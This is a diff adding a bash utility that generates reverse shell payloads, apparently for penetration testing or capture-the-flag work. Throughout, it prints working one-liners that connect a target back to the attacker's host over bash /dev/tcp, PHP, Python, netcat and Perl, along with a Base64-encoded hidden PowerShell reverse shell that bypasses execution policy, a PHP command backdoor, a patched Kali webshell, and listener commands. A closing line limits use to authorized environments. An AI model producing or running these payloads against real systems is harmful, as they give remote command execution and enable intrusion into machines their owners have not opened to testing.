@@ -1,0 +1,136 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+LHOST=""
+LPORT="443"
+
+usage(){ cat <<USAGE
+Usage: revshells [-i LHOST] [-p LPORT]
+Print common reverse shells, PHP webshell helpers, and a Base64-encoded PowerShell payload.
+If -i is omitted, auto-detects tun0 or default route IP.
+USAGE
+}
+
+while getopts "i:p:h" opt; do
+  case "$opt" in
+    i) LHOST="$OPTARG" ;;
+    p) LPORT="$OPTARG" ;;
+    h) usage; exit 0 ;;
+  esac
+done
+
+# Auto-pick your VPN IP if present, else default route IP
+if [[ -z "${LHOST}" ]]; then
+  if ip -o -4 addr show tun0 &>/dev/null; then
+    LHOST=$(ip -o -4 addr show tun0 | awk '{print $4}' | cut -d/ -f1)
+  else
+    LHOST=$(ip route get 1.1.1.1 | awk '{print $7; exit}')
+  fi
+fi
+
+# ---------- PowerShell payload (plain) ----------
+ps_payload=$(cat <<'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()
+}
+$client.Close()
+EOF
+)
+ps_payload=${ps_payload//\{\{LHOST\}\}/$LHOST}
+ps_payload=${ps_payload//\{\{LPORT\}\}/$LPORT}
+
+# Encode to UTF-16LE then Base64 for -EncodedCommand
+if command -v iconv >/dev/null 2>&1; then
+  ps_b64=$(printf "%s" "$ps_payload" | iconv -t UTF-16LE | base64 -w0)
+else
+  # fallback via Python if iconv missing
+  ps_b64=$(python3 - <<PY
+import sys,base64
+s = sys.stdin.read()
+print(base64.b64encode(s.encode('utf-16le')).decode(), end="")
+PY
+<<< "$ps_payload")
+fi
+ps_one="powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $ps_b64"
+
+# ---------- Main block ----------
+block=$(cat <<'EOF'
+======================= [+ BASH ] =======================
+bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
+
+======================= [+ PHP ] ========================
+php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");'
+
+==================== [+ PYTHON 3 ] ======================
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+
+====================== [+ NETCAT ] ======================
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
+# If busybox nc supports -e:
+# nc {{LHOST}} {{LPORT}} -e /bin/sh
+
+======================= [+ PERL ] =======================
+perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+=================== [+ POWERSHELL (plain) ] =============
+# Use when you can paste plain text:
+# (Same logic as -EncodedCommand but not encoded)
+# See encoded variant below.
+
+====================== [+ LISTENERS ] ===================
+# Linux listener (recommended)
+rlwrap -r nc -lvnp {{LPORT}}
+# or ncat:
+ncat -lvnp {{LPORT}}
+EOF
+)
+block=${block//\{\{LHOST\}\}/$LHOST}
+block=${block//\{\{LPORT\}\}/$LPORT}
+
+printf "%s\n" "$block"
+
+# ---------- Extra: PHP one-liner webshell ----------
+cat <<'EOF'
+
+================== [+ PHP: CMD GET backdoor ] ==================
+<?php echo system($_GET['cmd']); ?>
+
+================== [+ Kali PHP webshells (paths) ] =============
+/usr/share/webshells/php/php-reverse-shell.php
+/usr/share/webshells/php/simple-backdoor.php
+
+# Quick patch & copy of php-reverse-shell with your current IP/port:
+# (creates ./rs.php with \$ip='{{LHOST}}', \$port={{LPORT}})
+cp /usr/share/webshells/php/php-reverse-shell.php ./rs.php && \
+sed -E -i "s/\$ip\s*=\s*'[^']+';/\$ip = '{{LHOST}}';/; s/\$port\s*=\s*[0-9]+;/\$port = {{LPORT}};/" rs.php
+
+EOF
+
+# substitute LHOST/LPORT inside the above helper line
+perl -0777 -pe "s/\{\{LHOST\}\}/$LHOST/g; s/\{\{LPORT\}\}/$LPORT/g" <<< ""
+
+# ---------- PowerShell Encoded ----------
+cat <<EOF
+================= [+ POWERSHELL (Base64 Encoded) ] ==============
+# Base64 (UTF-16LE) payload:
+$ps_b64
+
+# One-liner to run on target:
+$ps_one
+EOF
+
+# ---------- Reminder ----------
+cat <<'EOF'
+
+[!] Use only in authorized environments. After you catch a shell:
+    python3 -c 'import pty; pty.spawn("/bin/bash")' ; export TERM=xterm-256color
+    Ctrl+Z ; stty raw -echo; fg ; reset ; stty rows <N> columns <M>
+EOF
